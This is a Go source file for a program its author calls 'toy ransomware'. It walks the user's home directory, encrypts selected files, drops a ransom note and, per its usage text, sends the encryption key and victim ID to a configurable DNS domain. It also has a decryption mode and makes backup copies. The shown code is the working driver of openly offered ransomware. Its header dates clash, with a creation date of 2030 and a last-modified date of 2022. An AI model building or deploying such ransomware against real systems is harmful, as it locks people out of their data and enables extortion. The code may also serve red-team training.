// Program toyramsomware is toy ransomware
package main

/*
 * toyramsomware.go
 * Toy Ransomware
 * By J. Stuart McMurray
 * Created 20300409
 * Last Modified 20221005
 */

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"golang.org/x/crypto/nacl/secretbox"
)

var (
	domain = "example.com" /* Default DNS domain for key. */
)

func main() {
	start := time.Now()
	var (
		decryptKey = flag.String(
			"decrypt",
			"",
			"Decryption `key`",
		)
		encSuffix = flag.String(
			"encryption-suffix",
			"etrbak",
			"Backup `suffix` to use when encrypting files",
		)
		ransomNoteName = flag.String(
			"note",
			"ransomware.txt",
			"Ransom note `name`",
		)
		fileRE = flag.String(
			"regex",
			"",
			"Regular `expression` used to select files to encrypt",
		)
		chunkLen = flag.Uint(
			"chunk",
			1024,
			"Encrypted chunk `size`",
		)
		root = flag.String(
			"root",
			currentHomeDir(),
			"Root of `directory` tree or single file to encrypt "+
				"or decrypt",
		)
	)
	flag.StringVar(
		&domain,
		"domain",
		domain,
		"DNS `domain` to which to send key and ID",
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options] 

Toy ransomware.  Encrypts files.  A backup of the file is made and the key and
ID are sent back to via DNS as key.id.domain.

With -decrypt decrypts files.  Uses the same key.id as sent in the DNS message.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Get the regex to use to select files */
	var (
		err error
		re  *regexp.Regexp
	)
	if "" != *fileRE {
		if re, err = regexp.Compile(
			*fileRE,
		); nil != err {
			log.Fatalf(
				"Error compiling regex %q: %v",
				*fileRE,
				err,
			)
		}
	}

	/* Work out whether we're encrypting or decrypting */
	var wf filepath.WalkFunc
	if "" != *decryptKey {
		wf = Decrypter{
			Key: KeyFromString(
				strings.Trim(*decryptKey, " ."),
			),
			Buffer: make(
				[]byte,
				*chunkLen+24+secretbox.Overhead,
			),
		}.Decrypt
	} else {
		var ID string
		e := Encrypter{
			RansomNoteName: *ransomNoteName,
			BackupSuffix:   *encSuffix,
			Out:            []byte{},
			Message:        make([]byte, int(*chunkLen)),
			FileRE:         re,
		}
		/* Come up with the key and ID */
		if ID, e.Key = GenerateKeyAndID(domain); nil != err {
			log.Fatalf("Error generating key and ID: %v", err)
		}

		/* Fill in the note template */
		FilledNoteTemplate = []byte(fmt.Sprintf(NoteTemplate, ID))

		/* Use this on the files */
		wf = e.Encrypt
	}

	/* Walk the file tree and encrypt or decrypt files */
	if err := filepath.Walk(*root, wf); nil != err {
		log.Fatalf(
			"Error after %v: %v",
			time.Since(start).Round(time.Millisecond),
			err,
		)
	}
	log.Printf("Done in %v", time.Since(start).Round(time.Millisecond))
}

// currentHomeDir tries to return the current home directory.  If it can't be
// found it returns the current working directory.
func currentHomeDir() string {
	cu, err := user.Current()
	if nil != err {
		log.Printf("Error getting current user: %v", err)
		return "."
	}
	if "" == cu.HomeDir {
		log.Printf("Unable to find current user's home directory")
		return "."
	}
	return cu.HomeDir
}
